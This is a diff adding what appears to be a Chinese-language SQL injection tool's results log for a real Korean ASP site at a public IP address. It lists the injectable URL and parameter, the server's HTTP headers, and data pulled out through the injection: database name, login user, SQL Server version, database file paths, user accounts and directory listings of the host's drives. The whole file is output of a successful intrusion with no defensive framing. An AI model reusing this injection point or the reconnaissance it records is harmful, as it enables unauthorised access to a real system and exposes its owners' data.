@@ -1,0 +1,187 @@
+■漏洞信息:============================================================
+ ·URL:http://124.0.160.248/board/down.asp?file_dire=board_qna&id=55
+ ·页面标题：
+ ·参数:file_dire=board_qna&id=55
+ ·方法:GET
+ ·类型:String
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:124.0.160.248
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Server: WWW - Server  1.1
+Date: Mon, 04 Apr 2011 08:14:06 GMT
+X-Powered-By: ASP.NET
+Content-Disposition: attachment;filename=切背 家加 荐康厘 款康 包访 炼肥 力沥俊 措窍咯.hwp 
+Content-Length: 25747
+Connection: Keep-Alive
+Content-Length: 25747
+Content-Type: application/unknown
+Set-Cookie: ASPSESSIONIDACRAQAAB=ALGJHLHDJPODNGFJAHFECJFG; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：edunew
+- 用户名：jbe1
+- 版本：Microsoft SQL Server  7.00 - 7.00.1063 (Intel X86) 
+	Apr  9 2002 14:18:16 
+	Copyright (c) 1988-2002 Microsoft Corporation
+	Standard Edition on Windows NT 5.0 (Build 2195: Service Pack 4)
+
+- 服务器名：JEO
+- 服务名：MSSQLServer
+- 系统用户名：jbe1
+
+ ·当前用户权限：
+获取用户权限失败！
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+edunew	c:\MSSQL7\Data\edunew_Data.MDF	
+master	C:\MSSQL7\DATA\MASTER.MDF	
+model	C:\MSSQL7\DATA\model.mdf	
+msdb	C:\MSSQL7\DATA\msdbdata.mdf	
+Northwind	C:\MSSQL7\DATA\northwnd.mdf	
+pubs	C:\MSSQL7\DATA\pubs.mdf	
+tempdb	C:\MSSQL7\DATA\TEMPDB.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			Nov 13 1998  2:58AM	
+guest	.	.	Nov 13 1998  2:58AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+Dir of D:: 
+
+BACKUP\
+msdownld.tmp\
+RECYCLER\
+System Volume Information\
+UTIL\
+
+Dir of C:: 
+
+70SP4\
+Config.Msi\
+Documents and Settings\
+file_upload\
+gpin-tomcat-5.5.26\
+HNC\
+Inetpub\
+MSSQL7\
+mysql\
+php\
+Program Files\
+RECYCLER\
+System Volume Information\
+Temp\
+WINNT\
+XecureSSL\
+pass_distribute_sock.log
+PassAgentDistribute.log
+supdate.log
+
+Dir of C:\Inetpub: 
+
+AdminScripts\
+ftproot\
+iissamples\
+mailroot\
+scripts\
+wwwroot\
+
+Dir of C:\Inetpub\wwwroot: 
+
+..\
+.\
+_private\
+_vti_cnf\
+_vti_log\
+_vti_pvt\
+_vti_script\
+_vti_txt\
+aspnet_client\
+images\
+_vti_inf.html
+help.gif
+iisstart.asp
+localstart.asp
+mmc.gif
+pagerror.gif
+postinfo.html
+print.gif
+warning.gif
+web.gif
+win2000.gif
+
+Dir of C:\Inetpub\wwwroot\..: 
+
+AdminScripts\
+ftproot\
+iissamples\
+mailroot\
+scripts\
+wwwroot\
+
+Dir of C:\Inetpub\wwwroot\..\wwwroot: 
+
+..\
+.\
+_private\
+_vti_cnf\
+_vti_log\
+_vti_pvt\
+_vti_script\
+_vti_txt\
+aspnet_client\
+images\
+_vti_inf.html
+help.gif
+iisstart.asp
+localstart.asp
+mmc.gif
+pagerror.gif
+postinfo.html
+print.gif
+warning.gif
+web.gif
+win2000.gif
+
+Dir of C:\Inetpub\wwwroot\_private: 
+
+..\
+.\
+
+Dir of C:\Inetpub\wwwroot\_private\..: 
+
+..\
+.\
+_private\
+_vti_cnf\
+_vti_log\
+_vti_pvt\
+_vti_script\
+_vti_txt\
+aspnet_client\
+images\
+_vti_inf.html
+help.gif
+iisstart.asp
+localstart.asp
+mmc.gif
+pagerror.gif
+postinfo.html
+print.gif
+warning.gif
+web.gif
+win2000.gif
+
+Dir of C:\Inetpub\wwwroot\aspnet_client: 
